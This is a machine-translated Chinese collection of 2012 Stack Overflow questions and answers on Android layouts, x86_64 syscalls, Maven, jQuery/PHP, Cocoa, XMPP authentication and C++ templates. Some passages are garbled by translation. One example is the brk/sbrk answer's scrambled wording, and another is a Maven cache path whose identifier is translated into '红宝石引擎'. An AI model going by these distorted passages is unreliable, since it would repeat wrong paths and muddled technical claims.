我有一个应用程序，我想提高该应用程序的性能。为此，我正在尝试使用 Ruby Socket，以便每当数据库中的数据发生更改时，相应的页面都会自动更改。

我只想确认这是否可能，以及是否有可能使用 Ruby 套接字的一些演示应用程序。

如果无法使用 Ruby Socket，还有哪些其他方法可以改善应用程序页面的加载时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T16:16:47.833

在所有提高应用程序性能的方法中，使用 Ruby 套接字似乎是最后的办法。提高性能真的取决于瓶颈在哪里，所以我首先要弄清楚你到底在哪里遇到了问题。我会为此推荐[New Relic](https://newrelic.com) ，如果它不在您的预算之内，您甚至可以使用[免费的本地开发模式版本。](https://newrelic.com/docs/ruby/developer-mode)您的数据库响应不够快吗？你的 Ruby 代码在请求中做的太多了吗？您的服务器是否需要更多资源（内存、cpu 等）？一旦确定了性能问题的所在，就可以直接针对每个问题。

# android - 如何在 GridView 中设置单元格对齐？

> ID：12760702
> 
> 赞同：1
> 
> 时间：2012-10-06T14:32:32.423
> 
> 标签：android

我有以下布局：

```
<GridView
    android:id="@+id/gridViewCalendar"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center"
    android:numColumns="7" >
</GridView> 
```

下面的代码制作了简单的 ArrayAdapter：

```
private View initializeCalendarScreen(LayoutInflater inflater) {
    View layout=inflater.inflate(R.layout.calendar_layout, null);
    GridView events=(GridView)layout.findViewById(R.id.gridViewCalendar);

    ArrayAdapter<String> adapter=new ArrayAdapter<String>(context, android.R.layout.simple_list_item_1, items);
    events.setAdapter(adapter);
    return layout;
} 
```

它可以工作，但单元格中的文本不在中心 - 它默认左对齐。我该如何解决？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T14:42:54.430

您应该为项目创建自己的布局，而不是使用 android.R.layout.simple_list_item_1 布局是这样制作的，如 android SKD 所示：

```
<TextView xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@android:id/text1"
android:layout_width="match_parent"
android:layout_height="wrap_content"
android:textAppearance="?android:attr/textAppearanceListItemSmall"
android:gravity="center_vertical"
android:paddingLeft="?android:attr/listPreferredItemPaddingLeft"
android:paddingRight="?android:attr/listPreferredItemPaddingRight"
android:minHeight="?android:attr/listPreferredItemHeightSmall"
/> 
```

您可以简单地复制它，但放置 android:gravity="center" 或修改它以满足您的需要

# segmentation-fault - brk 调用后的 x86_64 printf 段错误

> ID：12760705
> 
> 赞同：3
> 
> 时间：2012-10-06T14:32:55.327
> 
> 标签：segmentation-fault, printf, x86-64, brk

当我尝试使用 brk (int 0x80 with 45 in %rax) 在汇编中实现一个简单的内存管理器程序并按顺序打印块时，我一直遇到段错误。过了一会儿，我只能重现错误，但不知道为什么会这样：

```
 .section    .data
    helloworld:
    .ascii  "hello world"
    .section    .text
    .globl      _start
_start:

    push    %rbp
    mov     %rsp, %rbp

    movq    $45, %rax  
    movq    $0, %rbx   #brk(0) should just return the current break of the programm
    int     $0x80

    #incq    %rax #segfault
    #addq    $1, %rax #segfault
    movq    $0, %rax #works fine?
    #addq    $1, %rax #segfault again?

    movq    $helloworld, %rdi
    call    printf

    movq    $1, %rax #exit
    int     $0x80 
```

在此处的示例中，如果注释行未注释，则我有段错误，但某些命令（如 de movq $0, %rax）工作正常。在我的另一个程序中，前几个 printf 工作，但第三个崩溃...寻找其他问题，我听说 printf 有时会分配一些内存，并且不应该使用 brk，因为在这种情况下它会破坏堆或者什么...我很困惑，有人知道吗？

编辑：我刚刚发现要让 printf 工作，你需要 %rax=0。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-07T21:43:13.980

您的直接问题是您使用了错误的系统调用号： 45 是`SYS_brk`on `i*86`，但 on `x86_64` 45 是`SYS_recvfrom`。同样，`SYS_exit`是 60 on `x86_64`。您可以像这样找到正确的数字：

```
echo "#include <syscall.h>" | gcc -xc - -E -dD | egrep '__NR_(brk|exit) '
#define __NR_brk 12
#define __NR_exit 60

echo "#include <syscall.h>" | gcc -xc - -E -dD -m32 | egrep '__NR_(brk|exit) '
#define __NR_exit 1
#define __NR_brk 45 
```

您的第二个问题是这`int $0x80`不是调用系统调用的标准方法`x86_64`；你应该`syscall`改用。

正如 nneonneo 正确指出的那样，您的第三个问题是系统调用的参数`x86_64`传入`%rdi`,`%rsi`等，而不是传入`%rbx`.

通过上述更改，我得到（注释掉 printf）：

```
strace ./a.out
execve("./a.out", ["./a.out"], [/* 68 vars */]) = 0
brk(0)                                  = 0x15b9000
_exit(0)                                = ? 
```

将其与您的原始程序（没有 printf）进行比较：

```
execve("./a.out", ["./a.out"], [/* 68 vars */]) = 0
recvfrom(0, NULL, 0, 0, NULL, NULL)     = 29184000
write(6291768, NULL, 0 <unfinished ... exit status 0> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-07T21:53:08.343

您的下一个问题是 x86_64 系统调用调用约定使用 %rdi、%rsi、%rdx、%r10、%r8 和 %r9 以该顺序最多传递六个参数（而不是 %ebx、%ecx、%edx , %esi, %edi, %ebp 在 x86_32 中使用）。

因此，您必须将`brk`' 的第一个参数放在 %rdi 中：

```
movq    $12, %rax  
movq    $0, %rdi
syscall 
```

在支持它的内核上， using`int 0x80`实际上会调用具有 32 位调用号和寄存器分配的 32 位系统调用（为了兼容性）。如果您有这样的内核，那么您的代码片段应该可以工作。如果你不这样做，那么你的程序一执行就会死掉`int 0x80`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-28T22:53:33.223

`sbrk`由于没有其他人指出这一点：不，使用非零参数调用是不安全的，或者根本不安全`brk`，除非调用函数是`malloc`当前可执行映像中唯一且唯一的实现。更具体地说，如果您`brk`从实现外部更改区域的大小`malloc`，您很可能会损坏`malloc`的内部数据结构，这将导致您的程序在下次使用`malloc`或时崩溃`free`。此外，*任何*不在[异步信号安全函数](http://pubs.opengroup.org/onlinepubs/009695399/functions/xsh_chap02_04.html)短列表中的 C 库函数（列表在该文档的末尾附近）都可以`malloc`在后台调用，`printf`尤其是在 Linux 上确实可以调用。

PS 即使您使用汇编语言进行编码，您也确实应该使用 C 库的 shim 进行系统调用；这将使您免受 x86-32 和 x86-64 之间系统调用号的差异的影响，并且在其他方​​面也有帮助，例如设置`errno`和确保您使用处理器可用的最有效的陷阱序列。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-07-28T05:48:41.110

> 编辑：我刚刚发现要让 printf 工作，你需要 %rax=0。”</p>

这恰到好处。除了 x86_64 兼容问题之外，必须将 %rax 设置为正确的值才能使 printf() 正常工作。

根据 x86_64 ABI 文档（[http://x86-64.org/documentation/abi.pdf](http://x86-64.org/documentation/abi.pdf)），第 3.5.7 节变量参数列表：

> 当调用采用变量参数的函数时，%rax 必须设置为向量寄存器中传递给函数的浮点参数的总数。

由于 printf 是一个 var_arg 函数，因此您需要明确告诉 C 库您不想将任何浮点类型传递给它，也就是。移动 0，%rax。

# objective-c - 更新 statusItem 标题

> ID：12760707
> 
> 赞同：1
> 
> 时间：2012-10-06T14:33:05.360
> 
> 标签：objective-c, cocoa, nsstatusitem

如何更新我的 statusItem 标题？目前我用计时器做

```
[NSTimer scheduledTimerWithTimeInterval:0.01 target:self selector:@selector(myVoid) userInfo:nil repeats:YES]; 
```

空白是：

```
-(void)myVoid {

statusItem = [[[NSStatusBar systemStatusBar] statusItemWithLength:NSVariableStatusItemLength] retain];
[statusItem setTitle:myString];

} 
```

变化的内容`myString`。如何更新标题？目前，当我更新它时，会出现另一个 statusItem 和另一个...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T14:35:51.800

创建一次 statusItem 并在 ivar 中保留对它的引用，然后`setTitle`在此基础上创建一个新的 statusItem，而不是每次都创建一个新的 statusItem（`statusItemWithLength:`创建一个新项目）。

# iphone - iTunes上缺少本地化屏幕截图错误

> ID：12760709
> 
> 赞同：28
> 
> 时间：2012-10-06T14:33:22.060
> 
> 标签：iphone, ios, binary, itunes

我已选择默认语言为“澳大利亚英语”作为默认语言。当我提交二进制文件时，它显示为被拒绝的“红色图标”，状态为“缺少本地化截图”。该应用程序只有一种语言。我还添加了屏幕截图，该应用程序仅适用于 iphone。

当我查看显示为的二进制信息时：

本地化：（“en-AU”）

请建议我在哪里犯错。

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-10-06T14:37:10.973

检查您是否有 iPhone 5 的屏幕截图。当 iP5 的屏幕截图丢失时，我遇到了同样的错误。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-12-11T15:58:59.257

基本上是错误告诉你**需要上传 iPhone5 设备屏幕截图**（至少一个屏幕截图）。

*所以解决问题：*

**1.您可以上传iPhone5设备的屏幕截图。或者**

**2.您可以从二进制文件中删除 Default-568h.png，在这种情况下，您的应用程序只需在 iPhone5 设备上以“*信箱”模式运行。***

因此，对您来说哪一个容易，只需采用它。

当我遇到问题时，我采用了第二个。

**很高兴帮助**:):)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-20T22:18:10.413

只需确保上传 iPhone 5 的屏幕截图。我的应用程序不是为 iphone 5 制作的，但我在 iphone 5 模拟器上运行它并拍摄屏幕截图并上传，一切正常。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-10T20:10:33.283

以上所有答案似乎都是正确的，但如果您没有 3.5 英寸的屏幕截图 - RETINA，请注意，这也可能发生。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-11-12T21:50:54.820

如果您已经有 3 英寸和 4 英寸的屏幕截图，请为 iPad 添加一个屏幕截图，这应该可以解决您的问题。iPad 拍摄是强制性的。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2016-08-11T10:33:04.020

问题已解决，仍然发布可能对某人有所帮助。请按照以下步骤操作：

1-上传5.5英寸显示屏截图。

2- 点击“设备管理器”。

3- 在这里，您将看到屏幕尺寸列表，其中包含左侧展开的选项和右侧的复选框“使用 5.5 英寸显示器”、“使用 4.7 英寸显示器”......等等。如果您不想使用与 5.5 英寸屏幕截图不同的图像，请单击这些复选框，否则请在此处上传具有正确尺寸的新图像。

4- 单击保存。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-02-17T22:12:53.627

就我而言，我有 iPhone 5（4 英寸显示屏）的屏幕截图，但它也想要 3.5 英寸的视网膜屏幕截图。

我添加了这些，应用程序进入“等待审核”状态，无需进一步操作。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-05-16T20:45:29.487

我遇到了同样的问题，我的解决方案是将开发目标中的“设备”仅更改为 iPhone（因为我只为 iPhone 插入屏幕）：

![在此处输入图像描述](../Images/1f2a99bff93c61368eabc48b1f1e4c68.png)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-10-07T17:33:09.943

您的应用程序没有任何问题 - 您需要从 iTunes Connect 元数据和上传部分添加屏幕截图。

一旦我添加了这些，应用程序就不会自动标记为缺少本地化屏幕截图。

不是最好的消息，但不是非常不准确。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2014-03-09T21:32:38.740

我遇到了这个问题，我的是在 GameSalad Creator 中制作的通用 iOS 应用程序，你需要所有相关屏幕的屏幕截图，即使它可以让你在没有它们的情况下继续前进。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2016-08-17T13:51:56.680

我在以前的版本中更改了应用程序的名称，但它对此感到窒息。我将应用程序的名称改回原来的名称，并且运行良好..

# java - Maven 无法解决本地依赖

> ID：12760715
> 
> 赞同：5
> 
> 时间：2012-10-06T14:34:19.693
> 
> 标签：java, maven-3

我有一个带有外部 jar 文件的项目内存储库的 Maven 项目。我使用 install 命令将 jar 文件安装到项目内存储库中，当我签入存储库时，jar 文件已安装，我还在 pom 文件中添加了依赖项配置。但是当我运行 mvn 编译文件时。我收到 mvn 无法解决依赖关系的错误

这是 Pom 片段：

```
 <repository>
    <id>repo</id>
    <releases>
        <enabled>true</enabled>
        <checksumPolicy>ignore</checksumPolicy>
    </releases>
    <snapshots>
        <enabled>false</enabled>
    </snapshots>
    <url>file://${project.basedir}/repo</url>
</repository> 
```

这是 POM 中的依赖项

```
<dependency>
      <groupId>Com.RubineEngine.GesturePoints</groupId>
      <artifactId>Com-RubineEngine-GesturePoints</artifactId>
      <version>1.0-SNAPSHOT</version>
    </dependency> 
```

这是错误消息：

[INFO] 最终内存：6M/309M

```
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal on project com-boundingbox-box: Could not resolve
 dependencies for project com.boundingbox.box:com-boundingbox-box:jar:1.0-SNAPSH
OT: Could not find artifact Com.RubineEngine.GesturePoints:Com-RubineEngine-Gest
urePoints:jar:1.0-SNAPSHOT -> [Help 1]
[ERROR]
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e swit
ch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR]
[ERROR] For more information about the errors and possible solutions, please rea
d the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/DependencyReso
lutionException 
```

有没有人对此错误有任何建议。

这是使用 U 和 X 开关后的错误消息

```
[DEBUG] =======================================================================
[DEBUG] Using connector WagonRepositoryConnector with priority 0 for file://C:\U
sers\FAISAL\Desktop\disaster\com-initialtheta-theta/repo
Downloading: file://C:\Users\FAISAL\Desktop\disaster\com-initialtheta-theta/repo
/Com/RubineEngine/GesturePoints/Com-RubineEngine-GesturePoints/1.0-SNAPSHOT/mave
n-metadata.xml
[DEBUG] Writing resolution tracking file C:\Users\FAISAL\.m2\repository\Com\Rubi
neEngine\GesturePoints\Com-RubineEngine-GesturePoints\1.0-SNAPSHOT\resolver-stat
us.properties
[DEBUG] Using connector WagonRepositoryConnector with priority 0 for http://repo
.typesafe.com/typesafe/releases/
Downloading: http://repo.typesafe.com/typesafe/releases/Com/RubineEngine/Gesture
Points/Com-RubineEngine-GesturePoints/1.0-SNAPSHOT/maven-metadata.xml
[DEBUG] Writing resolution tracking file C:\Users\FAISAL\.m2\repository\Com\Rubi
neEngine\GesturePoints\Com-RubineEngine-GesturePoints\1.0-SNAPSHOT\resolver-stat
us.properties
[DEBUG] Could not find metadata Com.RubineEngine.GesturePoints:Com-RubineEngine-
GesturePoints:1.0-SNAPSHOT/maven-metadata.xml in typesafe (http://repo.typesafe.
com/typesafe/releases/)
[DEBUG] Could not find metadata Com.RubineEngine.GesturePoints:Com-RubineEngine-
GesturePoints:1.0-SNAPSHOT/maven-metadata.xml in lib (file://C:\Users\FAISAL\Des
ktop\disaster\com-initialtheta-theta/repo)
[DEBUG] Skipped remote update check for Com.RubineEngine.GesturePoints:Com-Rubin
eEngine-GesturePoints:1.0-SNAPSHOT/maven-metadata.xml, already updated during th
is session.
[DEBUG] Failure to find Com.RubineEngine.GesturePoints:Com-RubineEngine-GestureP
oints:1.0-SNAPSHOT/maven-metadata.xml in http://repo.typesafe.com/typesafe/relea
ses/ was cached in the local repository, resolution will not be reattempted unti
l the update interval of typesafe has elapsed or updates are forced
[DEBUG] Skipped remote update check for Com.RubineEngine.GesturePoints:Com-Rubin
eEngine-GesturePoints:1.0-SNAPSHOT/maven-metadata.xml, already updated during th
is session.
[DEBUG] Failure to find Com.RubineEngine.GesturePoints:Com-RubineEngine-GestureP
oints:1.0-SNAPSHOT/maven-metadata.xml in file://C:\Users\FAISAL\Desktop\disaster
\com-initialtheta-theta/repo was cached in the local repository, resolution will
 not be reattempted until the update interval of lib has elapsed or updates are
forced 
```

看起来系统在两个存储库之间变得混乱。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-08-11T11:26:52.013

1.  检查是否在项目存储库中库的 pom 文件中正确设置了 groupId/artifactId（即 ${project.baseDir}\repo\Com....\1.0-SNAPSHOT\Com-RubineEngine-GesturePoints.pom）
2.  要摆脱“直到 lib 的更新间隔已过或强制更新才会重新尝试解析”错误，您需要从本地存储库（通常为 ~/.m2）中删除文件夹，即 ~/.m2/Com/红宝石引擎。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:40:52.853

尝试将启用的快照更改为 true。

```
<snapshots>
        <enabled>true</enabled>
</snapshots> 
```

# javascript - 两个选择框 - 通过选择加载

> ID：12760716
> 
> 赞同：0
> 
> 时间：2012-10-06T14:34:41.090
> 
> 标签：javascript, jquery, html, select

我希望，如果我在选择框 1 中选择一个值，该选择框 2 会加载依赖于选择框 1 的值。

这是我尝试的方法：

```
<head>
<script src="jquery/jquery-1.8.2.min.js" type="text/javascript"></script>
<script type="text/javascript">
$(document).ready(function() {
 $("#selectbox1").change(function(){
 var value = $(this).children('option.selected').val(); 
 $("#selectbox2").load("php/loadteams.php", {value: value} );

});
});

</script>
</head>

<body>

<?php 

include 'php/db.php';
$res = mysql_query("select * from liga", $connection);
echo '<select id="selectbox1">';
while($val = mysql_fetch_array($res)) {
    echo '<option value="'.$val['id'] .'">' . $val['name'] . '</option>';
}
echo '</select>';
mysql_close($connection);
?>

<select id="selectbox2"> </select> 
```

如您所见，我尝试使用 jquery。该文件`loadteams.php`如下所示：

```
<?php
include 'php/db.php';
$ligaid = mysql_real_escape_string($_POST['value']);

$result = mysql_query("select * from mannschaft where liga = '" . $ligaid . "'", $connection);

while($te = mysql_fetch_array($result)){
 echo '<option> ' . $te . '</option>';  
}

?> 
```

我不知道我的错误在哪里 - 你能帮帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:38:10.033

您应该尝试使用[`:selected`](http://api.jquery.com/selected-selector/)选择器，而不是`.selected`匹配具有所选名称的类。

~~另外，我相信该`.load()`方法通过 HTTP GET 发布数据，所以我相信你必须使用`$_GET["value"]`而不是`$_POST['value']`.~~

**更正：**

当您将数据作为对象提供时，它是通过 HTTP POST 发布的，所以请点击我的上述声明。来自 jQuery 文档：

> 如果数据作为对象提供，则使用 POST 方法；否则，假定为 GET。

# google-tv - 在 Google TV 上的 Chrome 中使用键盘上的颜色键

> ID：12760719
> 
> 赞同：1
> 
> 时间：2012-10-06T14:35:30.593
> 
> 标签：google-tv

我正在为 Google TV 编写一个 Web 应用程序，并希望使用遥控器上的颜色键进行导航。我没有从按键获得任何输入以响应 onkeypress 或 onkeydown 事件，有谁知道是否可以在 Web 应用程序中使用这些按键进行输入？我在 Google TV 上的应用程序中看到了密钥，但我怀疑这些可能是 Android 应用程序。我可以毫无困难地从键盘按键和 D 控制器获得输入。

在此先感谢，戈登。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-15T18:06:54.283

Web 应用程序当前不支持颜色键。Chrome 不会从遥控器接收颜色键的键事件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-15T18:55:44.513

这些颜色键专为电视上的通用遥控功能而设计。由于它们没有桌面等效项，因此 Chrome 不会为它们传递任何键码。

一般来说，对于可用的键和键码，请在此处使用键码测试器：

[https://developers.google.com/tv/web/docs/implement_for_tv#keyboard](https://developers.google.com/tv/web/docs/implement_for_tv#keyboard)

# java - 在Java（处理）中获取字符串的值并与ascii值进行比较

> ID：12760723
> 
> 赞同：0
> 
> 时间：2012-10-06T14:35:56.507
> 
> 标签：java, string

我是 java 新手，在我的程序的一部分中我被严重困住了。

我正在使用一个名为 Voce 的库。用于语音识别。它识别语音或单词，与内置语法进行比较，并将其打印为“字符串”值。例如：如果你说“五”，它会打印“五”。

我问这个问题的原因是。那我如何将该字符串值与所需值进行比较。例如：如果值为“五”，则将其存储在另一个字符串中以供进一步工作

这是代码：你可以在这里找到语音库 [http://voce.sourceforge.net/](http://voce.sourceforge.net/) //////////////////////// ////////////

```
 //import the libraries
import guru.ttslib.*;
import processing.serial.*;

//give our instances names
Serial treePort;
TTS tts;

void setup(){
  //the following initiates the voce library
  voce.SpeechInterface.init("libraries/voce-0.9.1/lib", true, true,"libraries/voce-0.9.1/lib/gram","digits");
  //start our port and also tts
  treePort = new Serial(this,Serial.list()[0],9600);
  tts = new TTS();
  //the following settings control the voice sound
  tts.setPitch( 180 );
  tts.setPitchRange( 90 );
  //tts.setPitchShift( -10.5 );
  treePort.write("73");   //send command to turn on the lights and open the eyes
}

void draw(){

  if (voce.SpeechInterface.getRecognizerQueueSize()>0){    //if voce recognizes anything being said
      String s = voce.SpeechInterface.popRecognizedString();      //assign the string that voce heard to the variable s
      println("you said: " + s);                          //print what was heard to the debug window.
      respond(s);
    } 

}
//This function will split the text up into multiple words, and decide how to animate depending on the length of each word and also pauses which are denoted by "!"
void respond(String input){
  if (input.length() > 0){  //we actually have something to say 
  voce.SpeechInterface.setRecognizerEnabled(false);    //stop listening, otherwise we will hear ourselves and go into a loop
  //this just splits up all the words sends motion
  String[] words = split(input," ");
  int howMany = words.length;

  for(int i=0;i<howMany;i++){
    String pieces[] = split(words[i],"!");  //if we see a ! then reading pauses slightly so it is a good time to blink
    if(pieces.length==2){
    treePort.write("1");
    int pause = int(random(100));
    if(pause>60){
      treePort.write("5");
    }
    else{
      treePort.write("7");
      delay(500);
    }
    }
    else{
      treePort.write("1");
    }

  }
  tts.speak(input);
  voce.SpeechInterface.setRecognizerEnabled(true);
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T14:59:09.973

您正在寻找的是同等功能...查看此参考以获取更多详细信息

[http://www.java-samples.com/showtutorial.php?tutorialid=660](http://www.java-samples.com/showtutorial.php?tutorialid=660)

# java - 无法在我的应用程序中使用 SWT nebula 小部件

> ID：12760724
> 
> 赞同：1
> 
> 时间：2012-10-06T14:35:59.257
> 
> 标签：java, eclipse-rcp, nebula

我已经在我的 Eclipse Juno 中安装了 Nebula Release。
我想使用`CDateTime`所以我在我`MANIFEST.MF`的插件项目中添加了一个依赖项：
即添加：`org.eclipse.nebula.widgets.cdatetime`在依赖项选项卡中。
我还确保它是`feature.xml`Feature 项目对应的依赖项的一部分。
但是当我运行我的应用程序时，我得到：

> 缺少约束：org.eclipse.nebula.widgets.cdatetime；捆绑版本="0.14.0"

为什么找不到星云小部件？
我在这里搞砸了什么？也许这很简单，但我是 eclipse 编程的新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-04T10:07:37.097

Nebula CDateTime 还需要 Nebula CWT (Common Widget Toolset) 项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-06-30T08:02:25.997

我今天用 nebula-cDateTime 遇到了这个问题。我意识到，添加 nebula-plugin 是不够的，您需要确保您的产品也适合它。

这里：

1.  转到**“运行配置”**（我假设您有一个基于产品的启动。如果您使用基于功能的启动，那么还要在功能中添加星云）
2.  选择您的产品并移至**“插件”-**选项卡
3.  按**“验证插件”**。它会告诉你缺少的插件。
4.  然后点击**“添加所需插件”-**按钮，**“应用”**和**“运行”**

# javascript - 画布尺寸已关闭

> ID：12760726
> 
> 赞同：0
> 
> 时间：2012-10-06T14:36:10.037
> 
> 标签：javascript, html, object, html5-canvas

我读到使用多个画布而不是将所有内容绘制到一个画布上更有效，因此在尝试此操作时，我注意到我正在编写双重代码。所以我想到了制作一个包含所有公共变量的函数。这是代码：

```
function CanvasElement(id, width, height, parent){
     this.id = id;
     this.width = width;
     this.height = height;
     this.parent = parent;
     this.canvas = document.createElement('canvas');

     document.getElementById(parent).appendChild(this.canvas);
} 
```

但是，当我像这样使用此功能时：

```
/*Parameters: id, width, height, parent element*/
var canvasBg = new CanvasElement('canvasBg', 640, 480, 'animation'); 
```

这就是问题所在：最终的画布元素比它应该的要小。如果要使功能之外的画布“正常”，那么最终的画布将是 640x480px。但是，当使用该函数创建元素时，尺寸要小得多。

关于为什么会发生这种情况或如何补救的任何想法？

我不想重写这些行来创建多个画布。我宁愿有一个我可以创建的对象，只在参数中给出属性。我还想知道我是否在如何实现这样的事情上走在正确的轨道上。非常感谢有关如何改进或在必要时应用不同方法以实现相同结果的建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:40:20.513

您似乎实际上并未将宽度或高度分配给画布本身，而只是将`CanvasElement`其包裹起来的对象。

试试这个：

```
function CanvasElement(id,width,height,parent) {
    this.canvas = document.createElement('canvas');
    this.canvas.id = id;
    this.canvas.width = width;
    this.canvas.height = height;
    document.getElementById(parent).appendChild(this.canvas);
} 
```

# msdeploy - 使用 MSDeploy 部署

> ID：12760729
> 
> 赞同：1
> 
> 时间：2012-10-06T14:36:34.463
> 
> 标签：msdeploy, webdeploy

是否有自定义 TFS2012 接口以通过 TFS 内网访问运行 MSDeploy 命令，而不是运行命令提示符？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T20:08:32.387

不幸的是，TF Web Access 2012 中没有这样的扩展端点。扩展 Web Access 的唯一方法是当今的工作项类型（仅适用于内部部署版本）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T19:10:52.470

您的意思是作为[构建的一部分](https://stackoverflow.com/questions/4041836/team-build-publish-locally-using-msdeploy)还是[在您的机器上使用 ms deploy ui](http://sedodream.com/2012/08/09/HowToCreateWebDeployPackagesInVisualStudio2012.aspx)，或者如果您的意思是通过 Web 访问，那么您可以使用[tfs deployer](http://tfsdeployer.codeplex.com/)？

# xmpp - 使用 php 连接到 windows live messenger xmpp

> ID：12760731
> 
> 赞同：-1
> 
> 时间：2012-10-06T14:36:45.443
> 
> 标签：xmpp, windows-live-messenger, xmpphp

如何将 xmpp windows live messenger 与 php 连接？我正在使用 xmpphp 和 jaxl 库，并且成功连接了 google talk。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T16:45:03.197

[Jaxl 库](https://github.com/abhinavsingh/JAXL/)内置了对`PLAIN`、google talk `X-OAUTH2`、`DIGEST-MD5`、`CRAM-MD5`、`SCRAM-SHA-1`和`EXTERNAL`facebook`X-FACEBOOK-PLATFORM`身份验证机制的支持。

它还提供了实现您在应用程序中可能需要的任何自定义身份验证机制的能力。实现`X-MESSENGER-OAUTH2`身份验证应该很容易，如下所述：

签出最新版本的[JAXL 库](https://github.com/abhinavsingh/JAXL/)并初始化您的 JAXL 客户端对象，如下所示：

```
require_once 'jaxl.php';
$client = new JAXL(array(
    'jid' => 'messenger.live.com', // <-- dummy jid required for DNS SRV lookup
    'pass' => '',
    'log_level' => JAXL_DEBUG
)); 
```

`on_stream_features`如下所示为事件注册回调并按照[msdn 文档](http://msdn.microsoft.com/en-us/library/live/hh826554.aspx)中的说明发送身份验证数据包：

```
$client->add_cb('on_stream_features', function($stanza) {
    global $client, $access_token;
    $auth = new JAXLXml('auth', NS_SASL, array('mechanism'=>'X-MESSENGER-OAUTH2'));
    $auth->t($access_token);
    $client->send($auth);
    return 'wait_for_sasl_response';
}); 
```

这应该让你继续前进。

**注意：**当前版本的 Jaxl 库依赖输入 jabber id 进行 DNS SRV 查找，从中提取目标主机：端口以建立套接字连接。因此，您必须为 和 传递虚拟值`jid`，`pass`如上所示（直到在将来的版本中修复此问题）。

我在没有任何测试的情况下编写了上述步骤，但它应该可以正常工作。有关如何使用[JAXLXml](https://github.com/abhinavsingh/JAXL/tree/v3.x/core/jaxl_xml.php)样式的 XML 创建的更多详细信息，请参见[此处](http://abhinavsingh.com/blog/2012/09/jaxlxml-strophe-style-xml-builder-working-with-jaxl-a-networking-library-in-php-part-2/)。

# objective-c - 主细节和单一视图应用程序混合

> ID：12760733
> 
> 赞同：0
> 
> 时间：2012-10-06T14:36:56.630
> 
> 标签：objective-c, ios, cocoa-touch, master-detail, tabbed

我是新来的iOS新手，所以如果我的问题很愚蠢，我提前道歉。我刚刚完成了有关 iOS 和 Xcode 的课程，并学习了如何构建不同类型的应用程序，例如主从应用程序、选项卡式应用程序或单视图应用程序。我的问题是：是否有可能构建一个应用程序，例如一个主从应用程序，但在一个视图上看起来像一个选项卡，看起来像一个基于另一个视图的页面？换句话说，是否有可能创建一个混合多种类型的应用程序？我到处都用谷歌搜索，但我找不到任何东西。我可能使用了错误的关键词，最重要的是，我是法国人。我不是在寻找精确的解释，只是如果有人能指出我在哪里寻找并继续学习的正确方向。提前致谢，祝您有美好的一天。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T11:54:49.073

好吧，我不确定这是否正是您要寻找的，但您可以看一下这个示例。它是 UISplitViewController 和 UITabBarController 的组合

[iPad 的自定义 UISplitViewController](http://www.alterplay.com/ios-dev-tips/2011/05/custom-uisplitviewcontroller-for-ipad.html)

# c++ - C++模板性能包含模型和内联模型

> ID：12760744
> 
> 赞同：0
> 
> 时间：2012-10-06T14:37:53.523
> 
> 标签：c++, templates, generics, include

如果我有一个 C++ 模板，我有两个选择（没有**export**关键字）来链接它们：

*   具有内联的包含模型 - 即在 .h 文件中包含定义和声明。这内联了所有函数并创建了一个大单元（虽然它很懒）

*   没有内联的包含模型 - 即包含此 .h 文件的内容：

代码：

```
// templateinstantiations.cpp
#include "array.cpp"
template class array <int, 50>; // explicit instantiation 
```

每次我想使用模板时，都要小心地显式实例化我需要的每种类型（这可能很无聊且难以维护）

我的问题是：我知道过度内联函数可能会导致内存抖动和性能损失。此外，在上述两种情况下，编译时间似乎都很长。第一种和第二种方法之间的权衡是什么？是否有选择第一个而不是第二个的标准，或者我只需要尝试它们并“计时”它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:18:34.667

我认为这个问题实际上不是关于模板，而是关于内联。出于运行时性能的目的，编译器在大多数情况下可能会做出正确的选择：如果它可以看到一个函数太大而无法从内联中受益，它可能会独立地生成任何内联函数的非内联版本函数是否为模板。每个翻译单元将创建自己的函数版本，链接器将选择使用一个（并希望丢弃其他未使用的副本，但它是否真的这样做取决于链接器和目标文件格式）。

